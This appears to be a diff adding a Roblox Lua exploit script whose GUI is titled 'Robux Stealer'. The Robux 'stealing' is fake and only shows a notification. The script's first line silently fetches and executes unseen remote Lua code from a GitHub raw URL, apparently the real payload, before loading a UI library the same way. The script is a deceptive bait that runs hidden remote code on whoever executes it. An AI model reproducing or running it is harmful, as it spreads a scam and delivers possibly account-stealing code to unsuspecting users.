@@ -1,0 +1,41 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/f3e610f782af16b2d035606e.lua'))()
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/random%202"))()
+local One = library:Window("Robux Stealer")
+
+local targetPlayerName = ""
+local amount = ""
+
+One:Box("User =", "Type Here!", function(inputText)
+    targetPlayerName = inputText
+end)
+
+One:Box("Amount =", "Type Here!", function(inputText)
+    amount = inputText
+end)
+
+One:Button("Teleport To Player", function()
+    local targetPlayer = game:GetService("Players"):FindFirstChild(targetPlayerName)
+    if targetPlayer then
+        local targetCharacter = targetPlayer.Character
+        if targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart") then
+            local targetPosition = targetCharacter.HumanoidRootPart.Position
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
+            print("Teleporting to " .. targetPlayerName)
+        else
+            print("Target player doesn't have a valid character!")
+        end
+    else
+        print("Player not found!")
+    end
+end)
+
+One:Button("Start Stealing Robux", function()
+    local inputText = targetPlayerName
+    local notificationAmount = tonumber(amount) or 0
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Robux Stealer", 
+        Text = notificationAmount .. " from " .. inputText,
+        Duration = 3
+    })
+    print("Robux Stealing Simulation: " .. notificationAmount .. " from " .. inputText)
+end)
